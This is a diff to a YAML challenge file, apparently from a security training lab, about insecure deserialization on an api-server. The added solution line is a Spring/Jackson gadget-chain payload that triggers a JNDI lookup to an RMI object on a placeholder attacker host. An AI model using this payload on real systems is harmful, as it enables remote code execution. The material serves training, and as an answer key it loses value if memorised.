@@ -1,6 +1,6 @@
 ---
 :description: |
-  TODO
+  Find the insecure deserialization and own the api-server
 
 :category: "server side attacks"
 :name: "Insecure deserialization"
@@ -9,4 +9,4 @@
   - "TODO"
 
 :solutions:
-  - "TODO"
+  - 'Dieses objekt in die Liste einfügen: ["org.springframework.beans.factory.config.PropertyPathFactoryBean",{"targetBeanName":"rmi://#ATTACKER-IP#:1099/EvilObject","propertyPath":"foo","beanFactory": ["org.springframework.jndi.support.SimpleJndiBeanFactory",{"shareableResources":["rmi://#ATTACKER-IP#:1099/EvilObject"]}]}]'
